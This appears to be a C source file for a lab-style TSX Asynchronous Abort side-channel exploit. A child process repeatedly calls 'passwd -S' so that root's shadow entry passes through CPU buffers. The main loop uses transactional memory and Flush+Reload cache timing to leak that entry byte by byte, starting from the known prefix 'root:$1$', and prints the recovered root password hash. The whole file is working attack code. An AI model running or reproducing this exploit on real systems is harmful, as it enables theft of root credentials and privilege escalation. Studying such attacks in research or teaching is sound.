#define _GNU_SOURCE
#include <stdio.h>        
#include <stdint.h>       
#include <stdlib.h>      
#include <string.h>       
#include <unistd.h>       
#include <sys/mman.h>     
#include <sys/types.h>    
#include <signal.h>       
#include <x86intrin.h>

#include "asm.h"

#define MINIMUM_HITS 3
#define EXPONENT 12
#define STRIDE 4096
#define PAGE_SIZE 4096
#define HASH_LENGTH 58
#define RELOADBUFFER_SIZE (256 * STRIDE)

#define ASCII_PRINTABLE_START 0x24 // = '$'
#define ASCII_PRINTABLE_END 0x7A   // = 'z'

#define KNOWN_START "root:$1$"
#define CACHE_THRESHOLD 150


unsigned char *reloadbuffer;
void *leakbuffer;
int found = -1;



int is_valid_md5_char(char c) {
    return (c >= 'a' && c <= 'z') || 
           (c >= 'A' && c <= 'Z') || 
           (c >= '0' && c <= '9') || 
           (c == '.') || 
           (c == '/') || 
           (c == ':') ||
           (c == '$');    
}


void reload(int index, size_t  *cache_hits) {
    // only printable ASCII 
    for(int j = ASCII_PRINTABLE_START; j <= ASCII_PRINTABLE_END; j++) {
        mfence();
        uint64_t start = rdtscp();
        *(volatile char*)(&reloadbuffer[j * STRIDE]);
        lfence();
        uint64_t end = rdtscp();
        
        uint64_t reload_time = end - start;
        if(reload_time < CACHE_THRESHOLD  && is_valid_md5_char(j)) {
             cache_hits[j] += 1;
             if(cache_hits[j] >= MINIMUM_HITS) {
                 found= j;
                 break;
             }
        }
    }
}


int main(int argc, char *argv[]) {

    pid_t pid = 0;
    pid= fork();


    //=============================== CHILD PROCESS ==================================
    // child process: continuously call passwdm-S
    if (pid == 0) {
        while (1) {
            int ret = system("passwd -S $(whoami) >/dev/null 2>&1");
            (void)ret;
         }
    }

    //=============================== PARENT INIT ==================================
    reloadbuffer = mmap(NULL, RELOADBUFFER_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE|
        MAP_ANONYMOUS|MAP_POPULATE|MAP_HUGETLB, -1, 0);
    memset(reloadbuffer, 0, RELOADBUFFER_SIZE);

    leakbuffer = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    //initialize leaked secret with known prefix
    char leaked_secret[HASH_LENGTH + 1];
    memcpy(leaked_secret, KNOWN_START, strlen(KNOWN_START));

    uint32_t iteration = 0;


    //============================= LEAKING LOOP ===============================

    
    // root:$1 = 6 charsr known -> we start from 7th index ........57 
    for (int index = 7; index < HASH_LENGTH; index++) {
        size_t cache_hits[256] = {0};
        found = -1;
        iteration = 0;


        // read 8bytes= the last 7 discovered bytes +1 out of bounds and mask the last one, that's what we want to leak
        register uint64_t known_prefix = 0;
        known_prefix = *((uint64_t *)&leaked_secret[index - 7]) & 0x00ffffffffffffff; // we only 0 the candidate byte 

        
        while (1) {
            // STEP 1: flush reload buffer
            for (int i = ASCII_PRINTABLE_START; i <= ASCII_PRINTABLE_END; i++) {
                clflush(&reloadbuffer[i * STRIDE]);
            }

            // STEP 2: TAA
            for (int j = 0; j < 200; j++) {
                void *leak_addr = leakbuffer + (index - 7);
                clflush(leak_addr);
                sfence();
                clflush(reloadbuffer);

                if (_xbegin() == _XBEGIN_STARTED) {
                    // load 8 bytes from leak address 
                    uint64_t leaked_data = *(uint64_t*)leak_addr;
                    
                    // substract known prefix 
                    leaked_data -= known_prefix;
                    
                    // rotate left by EXPONENT + 8 = 12 + 8 = 20 bits
                    int rotate_count = EXPONENT + 8;  // 20 bits
                    leaked_data = (leaked_data << rotate_count) | (leaked_data >> (64 - rotate_count));
                    
                    // access reload buffer
                    *(volatile char*)(reloadbuffer + leaked_data);
                    
                    _xend();
                }
            }

            asm volatile("mfence\n");

            // STEP 3: Reload and measure
            reload(index, cache_hits);

            if (found != -1) {
                break;
            }

            iteration++;
        }

        printf("[*] index=%d: %c iteration: %d\n", index, found, iteration);
        leaked_secret[index] = found;

    }

    printf("%s\n", leaked_secret);

    munmap(reloadbuffer, RELOADBUFFER_SIZE);
    munmap(leakbuffer, PAGE_SIZE);

    kill(pid , SIGKILL);

    return 0;
}
